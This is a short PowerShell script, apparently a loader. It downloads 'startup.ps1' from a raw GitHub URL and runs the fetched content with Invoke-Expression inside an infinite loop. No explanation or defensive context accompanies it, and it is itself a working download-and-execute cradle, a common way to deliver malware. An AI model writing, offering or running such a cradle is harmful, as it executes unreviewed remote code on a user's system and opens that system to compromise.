$scriptContent = Invoke-WebRequest -uri "https://raw.githubusercontent.com/43a1723/test/main/startup.ps1" -UseBasicParsing
while ($true) {
    Invoke-Expression $scriptContent.Content
}
